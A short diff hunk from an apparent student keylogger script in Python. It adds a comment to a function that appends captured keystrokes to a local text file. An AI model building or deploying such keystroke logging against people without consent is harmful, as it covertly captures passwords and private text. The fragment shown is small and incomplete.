@@ -15,6 +15,7 @@ def on_press(key):
 
 # to saved the typed text in a txt file 
 def write_file(keys):
+    #if file is not present or running code for first time we have to use "w" then afterwards use a+ 
     with open("MAJIOR PROJECT.txt","a+") as f:
         for key in keys:
             k = str(key).replace("'", "")
